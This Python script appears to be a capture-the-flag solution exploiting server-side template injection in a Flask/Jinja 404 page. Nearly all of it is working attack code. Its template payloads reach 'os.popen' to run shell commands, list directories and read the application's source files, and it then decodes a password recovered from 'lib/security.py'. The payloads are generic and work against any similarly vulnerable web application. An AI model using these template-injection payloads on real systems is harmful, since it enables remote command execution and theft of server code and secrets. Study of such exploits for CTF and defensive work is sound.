from pwn import *
import base64
import requests

# Occur SSTI Vuln in 404 page
url = 'http://dctf1-chall-injection.westeurope.azurecontainer.io:8080/'
ssti = ["{{79}}", "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}", "{{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}"]
string = ["Checked SSTI", "Execute ls", "Show app.py"]

log.info("Exploit")
# Stage 1
# If u look at app.py, you can see that /login is using validate_login().
for i in range(len(ssti)):
    res = requests.get(url+ssti[i]).text.replace("&#39;", "\"")
    log.info(string[i])
    log.info(" > " + res)

# Stage 2
# If u look at validate_login() in securit.py, you can know the password used by the server.
ssti = ["{{config.__class__.__init__.__globals__['os'].popen('ls lib').read()}}", "{{config.__class__.__init__.__globals__['os'].popen('cat lib/security.py').read()}}"]
string = ["Checked lib", "Show lib/security.py"]
for i in range(len(ssti)):
    res = requests.get(url + ssti[i]).text.replace("&#39;", "\"")
    log.info(string[i])
    log.info(" > " + res)

valid_password = "==QfsFjdz81cx8Fd1Bnbx8lczMXdfxGb0snZ0NGZ"
log.info(base64.b64decode(valid_password[::-1]))